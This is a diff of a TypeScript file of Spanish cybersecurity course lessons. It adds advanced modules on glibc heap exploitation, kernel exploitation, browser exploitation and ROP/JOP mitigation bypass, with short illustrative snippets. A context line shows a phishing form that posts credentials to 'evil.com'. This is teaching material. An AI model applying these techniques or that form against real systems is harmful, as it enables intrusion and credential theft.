@@ -2,7 +2,7 @@ import type { Lesson } from "./types";
 
 // Lecciones extendidas. Cada una pertenece a un módulo (sub: "MX") y se puede
 // renderizar con renderMarkdown() en lib/securities/cybersec/markdown.ts.
-// Cobertura: los 58 módulos del syllabus (M1-M58).
+// Cobertura: los 58 módulos del syllabus (M1-M58) + Doctorate Track (M59+).
 export const LESSONS: Lesson[] = [
   {
     id: 1,
@@ -698,6 +698,58 @@ export const LESSONS: Lesson[] = [
       { h: "HTML y Formularios", c: "🌐 El **frontend** es lo que ve la víctima — y lo que el phisher imita. HTML estructura la página; los **formularios** capturan datos.\n\n<form action='https://evil.com/steal' method='POST'>\n  <input name='user'>\n  <input name='pass' type='password'>\n</form>\n\nUn form puede enviar datos a CUALQUIER destino → base de las páginas de phishing." },
       { h: "Validación Client-Side y sus Límites", c: "⚠️ La validación en el navegador (required, pattern, JS) mejora UX pero **NO es seguridad**: el atacante la saltea con DevTools, Burp o curl.\n\n**Regla de oro:** TODA validación de seguridad ocurre en el **servidor**. El cliente nunca es de confianza.\n\nLo mismo con datos ocultos (hidden inputs, precios en el HTML): manipulables → validá en backend." },
       { h: "Phishing: Crear y Detectar", c: "🎣 Técnicas que usan los phishers:\n→ **Clonar el HTML/CSS** de un sitio real (Save As, HTTrack)\n→ **Homograph attacks** — Dominios con caracteres unicode similares (аpple.com con 'а' cirílica)\n→ **iframe injection / overlay** y trucos de CSS para ocultar la URL real\n\n🔍 **Detectar:** revisar la URL real, certificado, faltas de ortografía, formularios que apuntan a dominios ajenos, y enseñar a los usuarios a desconfiar de la urgencia." },
+    ],
+  },
+  {
+    id: 59,
+    title: "Heap Exploitation",
+    sub: "M59",
+    dur: "55m",
+    diff: "Doctorado",
+    sections: [
+      { h: "glibc Heap Internals", c: "🧠 El allocator de glibc (ptmalloc2) gestiona memoria dinámica con **chunks**. Cada chunk tiene metadata:\nstruct malloc_chunk {\n  size_t prev_size;\n  size_t size;       // incluye 3 flags: PREV_INUSE, IS_MMAPPED, NON_MAIN_ARENA\n  struct malloc_chunk *fd, *bk;        // free: forward/back\n  struct malloc_chunk *fd_nextsize, *bk_nextsize;\n};\nLos chunks libres se organizan en **bins**: tcache (per-thread), fastbins, unsorted, small y large. El **top chunk** es la frontera con memoria no usada.\n\nEntender la metadata es la base: la mayoría de los ataques corrompen `size` o los punteros `fd`." },
+      { h: "tcache y fastbin attacks", c: "🎯 **tcache poisoning** (glibc ≥2.26) es la técnica moderna por excelencia:\n// 1) free dos chunks → entran al tcache\nfree(a); free(b);\n// 2) UAF/overflow para sobrescribir el fd de un chunk en tcache\n*(size_t*)b = target_addr;   // fd ahora apunta a target\n// 3) dos malloc: el segundo devuelve target_addr → escritura arbitraria\nmalloc(size); char *evil = malloc(size); // evil == target_addr\n\n🔁 **Double free** — Liberar dos veces el mismo chunk corrompe la lista. glibc agregó el `key` del tcache y checks de fastbin, que el atacante debe evadir.\n⚡ **fastbin dup** — Variante clásica sobre fastbins (chequeo de `size` en el target)." },
+      { h: "Use-After-Free", c: "👻 Un **UAF** ocurre cuando se usa un puntero a memoria ya liberada (dangling pointer). Patrón de explotación:\n1. Objeto liberado → su chunk vuelve a un bin\n2. El atacante reclama ese chunk con un malloc del mismo tamaño y lo llena con datos controlados\n3. El código usa el objeto 'viejo' → ahora con contenido del atacante\n\nClásico: secuestrar una **vtable** (puntero a tabla de funciones) de un objeto C++ → control del flujo. Los UAF son la clase de bug más explotada en navegadores y kernels." },
+      { h: "House of Techniques", c: "🏠 Las 'House of *' son familias de primitivas que abusan del allocator:\n→ **House of Force** — Sobrescribir el `size` del top chunk con un valor enorme → malloc devuelve cualquier dirección\n→ **House of Spirit** — Hacer free de un chunk falso en el stack → reclamarlo\n→ **House of Einherjar** — Abusar del bit PREV_INUSE + prev_size para forzar consolidación hacia atrás\n→ **House of Orange** — De top chunk a unsorted bin attack + FILE struct (_IO_FILE) → RCE\n\n🛡️ Mitigaciones modernas: safe-linking (glibc ≥2.32 XORea los fd con un cookie), tcache key, alineación y checks de size. El exploit dev avanzado es una carrera contra estas defensas." },
+    ],
+  },
+  {
+    id: 60,
+    title: "Kernel Exploitation",
+    sub: "M60",
+    dur: "55m",
+    diff: "Doctorado",
+    sections: [
+      { h: "Kernel vs User Space", c: "👑 El kernel corre en el anillo más privilegiado (ring 0). Un exploit de kernel típicamente parte de código en user space (ring 3) y busca ejecutar con privilegios de kernel → control total de la máquina.\n\nLa frontera son las **syscalls** y los drivers (ioctl). La memoria de kernel y user está separada; cruzarla mal es justo lo que se explota.\n\nObjetivo habitual en Linux: sobrescribir la estructura **cred** del proceso (uid=0) o el puntero **modprobe_path**." },
+      { h: "Vulnerabilidades de Kernel", c: "🐞 Clases comunes:\n→ **UAF / Use-After-Free** — Punteros colgantes a objetos de kernel (la más explotada)\n→ **OOB read/write** — Índices o tamaños sin validar en arrays de kernel\n→ **Race conditions / TOCTOU** — Ej: **Dirty COW** (CVE-2016-5195), **Dirty Pipe** (CVE-2022-0847)\n→ **Integer overflow** → asignaciones cortas\n→ **Type confusion** en estructuras del kernel\n\nEl heap de kernel (SLUB/SLAB) tiene su propia explotación (heap spraying con objetos elegidos: msg_msg, pipe_buffer, etc.)." },
+      { h: "Primitivas", c: "🔧 De un bug a root:\n→ **ret2usr** — Redirigir ejecución de kernel a una función en user space (clásico, hoy bloqueado por SMEP)\n→ **Sobrescribir cred** — Llamar commit_creds(prepare_kernel_cred(0)) o parchear uid/gid a 0\n→ **modprobe_path** — Sobrescribir /sbin/modprobe con un script propio → se ejecuta como root al disparar un binario con magic inválido\n→ **Pipe primitives** — Dirty Pipe permite escribir en archivos de solo lectura\n\nEl heap spray ubica objetos controlables junto al bug para convertirlo en R/W arbitrario." },
+      { h: "Mitigaciones y Bypass", c: "🛡️ Defensas y la investigación para evadirlas:\n→ **SMEP** — El kernel no ejecuta páginas de user → mata ret2usr; se evade con **kROP** (ROP en kernel)\n→ **SMAP** — El kernel no accede a memoria de user sin stac/clac\n→ **KASLR** — Randomiza la base del kernel; se rompe con info leaks (o KASLR break por side-channel)\n→ **KPTI** (post-Meltdown) — Separa page tables de kernel/user\n→ **CFI, FG-KASLR, stack canaries**\n\nEl exploit moderno encadena un info-leak (vencer KASLR) + una primitiva de escritura (vencer SMEP/SMAP) para llegar a ejecución arbitraria." },
+    ],
+  },
+  {
+    id: 61,
+    title: "Browser Exploitation",
+    sub: "M61",
+    dur: "55m",
+    diff: "Doctorado",
+    sections: [
+      { h: "Arquitectura del Navegador", c: "🌐 Los navegadores modernos son multiproceso para aislar daño:\n→ **Proceso renderer** — Parsea HTML/CSS/JS, corre en un **sandbox** (sin acceso directo al SO)\n→ **Proceso broker/browser** — Privilegiado, media el acceso a archivos/red vía IPC\n→ **JS engine** — V8 (Chrome), SpiderMonkey (Firefox), JSC (Safari)\n\nUn exploit full-chain necesita DOS bugs: uno en el renderer (RCE en el sandbox) + un **sandbox escape** (IPC/broker) para llegar al SO." },
+      { h: "Vulnerabilidades del JS Engine", c: "🔬 Los JS engines son el blanco principal:\n→ **Type confusion** — El engine asume un tipo y recibe otro (ej: cambiar el 'shape'/'map' de un objeto)\n→ **OOB en el JIT** — El compilador JIT elimina bounds checks por una suposición que el atacante invalida\n→ **Bugs de array** (length, elements kind)\n\nDe un bug se construyen dos primitivas fundamentales:\nfunction addrof(obj) { /* obtiene la dirección de un objeto JS */ }\nfunction fakeobj(addr) { /* fabrica un objeto JS en una dirección */ }\nCon addrof + fakeobj se logra **R/W arbitrario** en el espacio del renderer." },
+      { h: "Explotación", c: "⚙️ Camino típico dentro del renderer:\n1. Bug → corromper el length de un TypedArray (ArrayBuffer) → OOB R/W relativo\n2. addrof/fakeobj → R/W **arbitrario**\n3. Leak de punteros para vencer ASLR\n4. Conseguir ejecución: sobrescribir un puntero de función, o abusar de **WASM/JIT** que reserva páginas RWX → escribir shellcode\n\nEl reto moderno: V8 movió a un **heap aislado de punteros comprimidos** y mitigaciones como el **V8 sandbox**, que complican el salto de R/W a code exec." },
+      { h: "Sandbox Escape", c: "🚪 Tener RCE en el renderer no alcanza: estás dentro del sandbox. El **escape** explota:\n→ Bugs en la capa **IPC** (mensajes mal validados hacia el proceso broker)\n→ Vulnerabilidades en el proceso privilegiado (GPU, network service)\n→ Bugs del SO accesibles desde el sandbox (kernel, drivers)\n\n🏆 En **Pwn2Own**, una cadena completa (renderer RCE + sandbox escape, a veces + kernel LPE) vale cientos de miles de dólares. Estudiar esos writeups es la mejor escuela de browser exploitation." },
+    ],
+  },
+  {
+    id: 62,
+    title: "ROP/JOP Avanzado y Bypass de Mitigaciones",
+    sub: "M62",
+    dur: "50m",
+    diff: "Doctorado",
+    sections: [
+      { h: "Code-Reuse Attacks", c: "🧩 Con **DEP/NX** la stack/heap no son ejecutables → no podés inyectar shellcode directo. La respuesta: **reutilizar código** que ya existe (libc, el binario).\n\n→ **ret2libc** — Redirigir el return a una función de libc (ej: system('/bin/sh'))\n→ **ROP** (Return-Oriented Programming) — Encadenar **gadgets** (secuencias cortas que terminan en `ret`) para componer cualquier lógica:\npop rdi; ret      // controla el 1er argumento\npop rsi; pop r15; ret\nsyscall; ret\nCada gadget es una 'instrucción' de tu programa virtual construido en la stack." },
+      { h: "Construcción de Cadenas", c: "🔗 Una cadena ROP real debe vencer **ASLR**:\n1. **Info leak** — Filtrar una dirección de libc (ej: vía un format string o un puntero en la GOT) para calcular la base\n2. **Stack pivoting** — Si el control de stack es limitado, pivotear rsp a un buffer controlado (xchg rsp, rax; ret)\n3. Construir la cadena: setear argumentos (pop gadgets) → llamar la función objetivo\n\n🛠️ Herramientas: **ROPgadget**, **ropper** (buscar gadgets), **pwntools** (automatizar el exploit), **angrop** (generación automática de cadenas)." },
+      { h: "JOP y Automatización", c: "🦘 Cuando los gadgets `ret` escasean o hay mitigaciones de stack, se usa **JOP** (Jump-Oriented Programming): gadgets que terminan en `jmp`/`call` a un registro, encadenados por un 'dispatcher gadget'.\n\nVariantes: **COOP** (Counterfeit Object-Oriented Programming) abusa de vtables de C++. La automatización (angrop, símbolic execution) busca cadenas en binarios grandes donde a mano sería inviable." },
+      { h: "CFI e Intel CET", c: "🛡️ Las mitigaciones modernas atacan el code-reuse en su raíz:\n→ **CFI** (Control-Flow Integrity) — Valida que los saltos indirectos vayan a destinos legítimos (LLVM CFI, Windows **CFG**)\n→ **Intel CET** — Dos partes en hardware:\n   • **Shadow Stack** — Copia protegida de las return addresses; un ROP que altera la stack se detecta al `ret`\n   • **IBT** (Indirect Branch Tracking) — Los destinos indirectos deben empezar con `endbr64` → mata JOP/COOP genérico\n\n🔬 La investigación de frontera busca bypasses: gadgets que empiezan con endbr64, ataques a la shadow stack, data-only attacks (corromper datos sin desviar control). Es el estado del arte de la explotación binaria." },
     ],
   },
 ];
